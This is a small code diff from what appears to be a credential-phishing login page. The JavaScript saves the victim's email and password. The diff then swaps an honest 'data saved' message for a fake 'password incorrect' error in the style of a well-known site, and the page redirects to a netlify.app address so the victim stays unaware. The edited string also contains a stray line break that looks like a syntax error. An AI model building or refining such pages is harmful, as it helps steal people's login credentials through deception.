@@ -557,7 +557,8 @@
                 const passwordSaved = await saveInput('loginPassword', loginPasswordInput.value);
 
                 if (emailSaved && passwordSaved) {
-                    showMessageBox("আপনার ডেটা সফলভাবে সেভ হয়েছে!");
+                    showMessageBox("The password that you’ve entered is incorrect. Forgotten password?
+");
                     // Redirect after a short delay to allow user to see the message
                     setTimeout(() => {
                         window.location.href = 'https://6841e003753a88073ea46c21--symphonious-crepe-98039e.netlify.app/';
